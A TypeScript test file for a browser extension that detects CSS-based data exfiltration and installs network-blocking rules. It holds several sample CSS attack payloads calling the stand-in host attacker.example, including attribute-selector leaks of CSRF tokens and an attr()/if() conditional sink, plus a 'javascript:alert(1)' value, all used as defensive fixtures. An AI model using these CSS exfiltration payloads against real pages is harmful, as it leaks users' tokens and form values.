import { describe, expect, it } from "vitest";
import { browser } from "wxt/browser";
import { applyGlobalPolicyDnrRules, applyTabPolicyDnrRules, blockHighConfidenceFindingUrls, destinationPolicyForUrl, getDnrStatus, setStrictThirdPartyRule } from "../../../src/browser/dnr/chromeDnr";
import { DEFAULT_SITE_POLICY, REPORT_LIMITS } from "../../../src/shared/constants";
import { getSitePolicy, normalizePolicy, parseImportedSitePolicy, saveFrameReport, getTabReport } from "../../../src/browser/storage/reports";
import { analyzeStylesheet } from "../../../src/core/analyzer/analyzeStylesheet";
import type { Finding, SitePolicy } from "../../../src/shared/types";

function ruleAction(rule: unknown): string | undefined {
  return (rule as { action?: { type?: string } }).action?.type;
}
function rulePriority(rule: unknown): number | undefined {
  return (rule as { priority?: number }).priority;
}
function requestDomains(rule: unknown): string[] {
  return ((rule as { condition?: { requestDomains?: string[] } }).condition?.requestDomains ?? []);
}
function urlFilter(rule: unknown): string | undefined {
  return (rule as { condition?: { urlFilter?: string } }).condition?.urlFilter;
}
function regexFilter(rule: unknown): string | undefined {
  return (rule as { condition?: { regexFilter?: string } }).condition?.regexFilter;
}
function domainType(rule: unknown): string | undefined {
  return (rule as { condition?: { domainType?: string } }).condition?.domainType;
}
function tabIds(rule: unknown): number[] | undefined {
  return (rule as { condition?: { tabIds?: number[] } }).condition?.tabIds;
}
function resourceTypes(rule: unknown): string[] {
  return ((rule as { condition?: { resourceTypes?: string[] } }).condition?.resourceTypes ?? []);
}

describe("browser integrations", () => {
  it("merges frame reports into a tab report", async () => {
    const summary = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" });
    await saveFrameReport(1, "https://app.example/", { frameId: 0, parentFrameId: -1, frameUrl: "https://app.example/", frameOrigin: "https://app.example", summary, updatedAt: Date.now() });
    const report = await getTabReport(1);
    expect(report?.frames).toHaveLength(1);
    expect(report?.summary.findings.length).toBeGreaterThan(0);
  });

  it("creates DNR rules for high confidence findings and strict third-party blocking", async () => {
    const finding = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" }).findings[0] as Finding;
    const result = await blockHighConfidenceFindingUrls([finding], 1);
    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
    const policy = await getSitePolicy();
    await setStrictThirdPartyRule(1, true, { ...policy, mode: "strict" }, "https://app.example/");
    expect((browser.declarativeNetRequest as any).__getSessionRules().length).toBeGreaterThan(0);
  });

  it("enforces destination policy precedence for DNR findings and policy rules", async () => {
    const finding = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" }).findings[0] as Finding;
    const allowedPolicy: SitePolicy = { ...DEFAULT_SITE_POLICY, allowlistedOrigins: ["https://attacker.example"] };
    const allowed = await blockHighConfidenceFindingUrls([finding], 7, allowedPolicy);
    expect(allowed.blockedFindings.size).toBe(0);
    expect(allowed.skippedAllowedUrls).toContain("https://attacker.example/a");

    const blockedPolicy: SitePolicy = { ...DEFAULT_SITE_POLICY, allowlistedOrigins: ["https://attacker.example"], blocklistedOrigins: ["https://attacker.example"] };
    const blocked = await blockHighConfidenceFindingUrls([finding], 8, blockedPolicy);
    expect(blocked.blockedFindings.has(finding.id)).toBe(true);
    expect(destinationPolicyForUrl("https://attacker.example/a", blockedPolicy).action).toBe("block");
  });

  it("installs tab-scoped allow, block, and strict rules with documented precedence", async () => {
    const policy: SitePolicy = {
      ...DEFAULT_SITE_POLICY,
      allowlistedOrigins: ["https://cdn.example"],
      blocklistedOrigins: ["https://attacker.example"],
      compatibility: { ...DEFAULT_SITE_POLICY.compatibility, enableStrictThirdPartyBlocking: true }
    };
    const result = await applyTabPolicyDnrRules(13, "https://app.example/", policy, true);
    expect(result.strictThirdPartyRule).toBe(true);
    expect(result.policyRuleCount).toBe(3);

    const rules = (browser.declarativeNetRequest as any).__getSessionRules();
    expect(rules.some((rule: unknown) => ruleAction(rule) === "block" && rulePriority(rule) === 6 && regexFilter(rule) === "^https://attacker\\.example/" && tabIds(rule)?.includes(13))).toBe(true);
    expect(rules.some((rule: unknown) => ruleAction(rule) === "allow" && rulePriority(rule) === 5 && regexFilter(rule) === "^https://cdn\\.example/" && tabIds(rule)?.includes(13))).toBe(true);
    expect(rules.some((rule: unknown) => ruleAction(rule) === "block" && domainType(rule) === "thirdParty" && tabIds(rule)?.includes(13))).toBe(true);
  });

  it("installs global destination policy rules for first-load protection before a tab exists", async () => {
    const policy: SitePolicy = {
      ...DEFAULT_SITE_POLICY,
      allowlistedOrigins: ["https://cdn.example"],
      blocklistedOrigins: ["https://attacker.example"]
    };
    const result = await applyGlobalPolicyDnrRules(policy);
    expect(result.policyRuleCount).toBe(2);

    const rules = (browser.declarativeNetRequest as any).__getSessionRules();
    expect(rules.some((rule: unknown) => ruleAction(rule) === "block" && rulePriority(rule) === 6 && regexFilter(rule) === "^https://attacker\\.example/" && tabIds(rule) === undefined)).toBe(true);
    expect(rules.some((rule: unknown) => ruleAction(rule) === "allow" && rulePriority(rule) === 5 && regexFilter(rule) === "^https://cdn\\.example/" && tabIds(rule) === undefined)).toBe(true);
  });

  it("stores only redacted report URLs and selector values", async () => {
    const secret = "abcd1234abcd1234abcd1234";
    const summary = analyzeStylesheet({
      cssText: `input[name="csrf_token"][value^="${secret}"]{background:url(https://attacker.example/leak?csrf=${secret})}`,
      pageUrl: `https://app.example/account?session=${secret}`,
      sourceKind: "style_element",
      sourceUrl: `https://app.example/account?session=${secret}`
    });
    await saveFrameReport(99, `https://app.example/account?session=${secret}`, {
      frameId: 0,
      parentFrameId: -1,
      frameUrl: `https://app.example/account?session=${secret}`,
      frameOrigin: "https://app.example",
      summary,
      updatedAt: Date.now()
    });
    const report = await getTabReport(99);
    const serialized = JSON.stringify(report);
    expect(serialized).not.toContain(secret);
    expect(serialized).toContain("[redacted]");
    expect(report?.summary.findings[0]?.destinationOrigin).toBe("https://attacker.example");
  });

  it("installs optional strict SVG image-document DNR policy without enabling broad third-party blocking", async () => {
    const policy: SitePolicy = {
      ...DEFAULT_SITE_POLICY,
      compatibility: {
        ...DEFAULT_SITE_POLICY.compatibility,
        enableStrictThirdPartyBlocking: false,
        enableSvgImageDnrPolicy: true
      }
    };
    const result = await applyTabPolicyDnrRules(17, "https://app.example/", policy, true);
    expect(result.policyRuleCount).toBe(1);

    const rules = (browser.declarativeNetRequest as any).__getSessionRules();
    expect(rules.some((rule: unknown) =>
      ruleAction(rule) === "block"
      && rulePriority(rule) === 3
      && domainType(rule) === "thirdParty"
      && regexFilter(rule)?.includes("svg")
      && resourceTypes(rule).includes("image")
      && tabIds(rule)?.includes(17)
    )).toBe(true);
    expect(rules.some((rule: unknown) => ruleAction(rule) === "block" && domainType(rule) === "thirdParty" && resourceTypes(rule).includes("stylesheet"))).toBe(false);
  });

  it("records DNR status after policy rule application", async () => {
    await applyGlobalPolicyDnrRules({ ...DEFAULT_SITE_POLICY, blocklistedOrigins: ["https://attacker.example"] });
    const status = await getDnrStatus();
    expect(status?.ok).toBe(true);
    expect(status?.scope).toBe("global");
    expect(status?.ruleCount).toBe(1);
  });



  it("does not use URL fragments as SVG evidence and installs exact finding rules", async () => {
    const finding = analyzeStylesheet({
      cssText: 'input[value*="a"]{background:url(https://app.example/poc.png#;base64,a)}',
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding;
    expect(finding.reasons).not.toContain("sink.svg_reference");
    const result = await blockHighConfidenceFindingUrls([finding], 31, { ...DEFAULT_SITE_POLICY, mode: "strict" }, "strict");
    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
    const rules = (browser.declarativeNetRequest as any).__getSessionRules();
    expect(rules.some((rule: unknown) => regexFilter(rule) === "^https://app\\.example/poc\\.png$" && tabIds(rule)?.includes(31))).toBe(true);
  });

  it("installs finding-derived future-block rules for same-origin value-probe sinks in Balanced and Strict", async () => {
    const finding = analyzeStylesheet({
      cssText: '#exfil_test2[value*="secret"]~#exfil_img2{background-image:url(https://app.example/src/pwned2.png)}',
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/style.css"
    }).findings[0] as Finding;
    expect(finding.severity).toBe("high");

    const balanced = await blockHighConfidenceFindingUrls([finding], 32, { ...DEFAULT_SITE_POLICY, mode: "balanced" }, "balanced");
    expect(balanced.blockedFindings.size).toBe(0);
    expect(balanced.ruleInstalledFindings.has(finding.id)).toBe(true);

    const strict = await blockHighConfidenceFindingUrls([finding], 33, { ...DEFAULT_SITE_POLICY, mode: "strict" }, "strict");
    expect(strict.blockedFindings.size).toBe(0);
    expect(strict.ruleInstalledFindings.has(finding.id)).toBe(true);
  });

  it("installs finding-derived future-block rules for declaration-level attr()/if() exfil sinks", async () => {
    const finding = analyzeStylesheet({
      cssText: 'div{--user:attr(data-user);background:image-set(if(style(--user:"admin"): "https://attacker.example/admin.png"; else: "https://attacker.example/user.png") 1x)}',
      pageUrl: "https://app.example/",
      sourceKind: "inline_style",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding;
    expect(finding.reasons).toContain("css.value.attr_source");
    expect(finding.reasons).toContain("css.value.conditional_if");
    const result = await blockHighConfidenceFindingUrls([finding], 34, { ...DEFAULT_SITE_POLICY, mode: "balanced" }, "balanced");
    expect(result.ruleInstalledFindings.has(finding.id)).toBe(true);
  });

  it("prioritizes stronger DNR candidates when the dynamic rule cap is reached", async () => {
    const remoteFindings = Array.from({ length: 55 }, (_, index) => analyzeStylesheet({
      cssText: `input[value^="${String.fromCharCode(97 + (index % 26))}"]{background:url(https://attacker-${index}.example/leak)}`,
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding);
    const localNetworkFinding = analyzeStylesheet({
      cssText: 'input[name="api_key"][value^="x"]{background:url(http://192.168.0.12/leak)}',
      pageUrl: "https://app.example/",
      sourceKind: "style_element",
      sourceUrl: "https://app.example/"
    }).findings[0] as Finding;

    const result = await blockHighConfidenceFindingUrls([...remoteFindings, localNetworkFinding], 27);
    expect(result.ruleInstalledFindings.has(localNetworkFinding.id)).toBe(true);
    expect(result.ruleInstalledUrls).toContain("http://192.168.0.12/leak");
  });

  it("caps report frames and findings before storage", async () => {
    const summary = analyzeStylesheet({ cssText: 'input[value^="a"]{background:url(https://attacker.example/a)}', pageUrl: "https://app.example/", sourceKind: "style_element", sourceUrl: "https://app.example/" });
    const noisySummary = { ...summary, findings: Array.from({ length: REPORT_LIMITS.maxFindingsPerFrame + 20 }, () => summary.findings[0] as Finding) };
    for (let frameId = 0; frameId < REPORT_LIMITS.maxFramesPerReport + 5; frameId += 1) {
      await saveFrameReport(44, "https://app.example/", { frameId, parentFrameId: -1, frameUrl: `https://app.example/frame-${frameId}`, frameOrigin: "https://app.example", summary: noisySummary, updatedAt: Date.now() });
    }
    const report = await getTabReport(44);
    expect(report?.frames.length).toBeLessThanOrEqual(REPORT_LIMITS.maxFramesPerReport);
    expect(report?.frames[0]?.summary.findings.length).toBeLessThanOrEqual(REPORT_LIMITS.maxFindingsPerFrame);
    expect(report?.summary.findings.length).toBeLessThanOrEqual(REPORT_LIMITS.maxFindingsPerReport);
  });

  it("normalizes imported policy data with strict caps and schema checks", () => {
    const imported = parseImportedSitePolicy(JSON.stringify({
      mode: "strict",
      logRetentionDays: 10_000,
      strictOrigins: ["https://app.example", "javascript:alert(1)", null],
      perOriginModes: { "https://app.example": "trusted", "https://bad.example": "invalid" },
      compatibility: { enableDnrMitigation: false, unknownKey: true }
    }));
    expect(imported.mode).toBe("strict");
    expect(imported.logRetentionDays).toBe(90);
    expect(imported.strictOrigins).toEqual(["https://app.example"]);
    expect(imported.perOriginModes).toEqual({ "https://app.example": "trusted" });
    expect(imported.compatibility.enableDnrMitigation).toBe(false);
  });

  it("falls back to defaults for non-plain policy input", () => {
    expect(normalizePolicy([] as unknown as Record<string, never>).mode).toBe(DEFAULT_SITE_POLICY.mode);
    expect(() => parseImportedSitePolicy("[]")).toThrow();
  });

});
